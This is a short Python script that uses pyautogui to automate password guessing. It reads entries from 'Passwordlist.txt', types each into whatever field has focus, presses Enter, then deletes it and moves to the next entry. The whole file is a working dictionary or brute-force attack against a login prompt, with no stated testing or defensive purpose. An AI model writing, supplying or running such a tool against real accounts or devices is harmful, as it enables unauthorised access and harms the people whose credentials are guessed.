import pyautogui , time
time.sleep(3)
f = open("Passwordlist.txt", 'r')
for word in f:
    pyautogui.typewrite(word)
    pyautogui.press("enter")
    time.sleep(1)
    for i in range(len(word)+1):
        pyautogui.press("backspace")
    time.sleep(2)